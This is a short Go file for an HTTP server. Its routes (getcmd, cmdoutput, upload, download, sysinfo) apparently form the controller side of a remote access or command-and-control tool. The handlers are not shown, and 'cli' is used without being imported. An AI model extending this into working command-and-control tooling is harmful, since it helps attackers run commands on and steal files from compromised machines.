package server

import (
	"fmt"
	"net/http"
)

func Start() {
	InitRoutes()
	err := cli.Run()
	if err != nil {
		fmt.Printf("Error running the CLI: %v\n", err)
	}
}

func InitRoutes() {
	http.HandleFunc("/getcmd", GetCmd)
	http.HandleFunc("/cmdoutput", CmdOutput)
	http.HandleFunc("/upload", FileUpload)
	http.HandleFunc("/download", FileDownload)
	http.HandleFunc("/sysinfo", GetSysinfo)
}
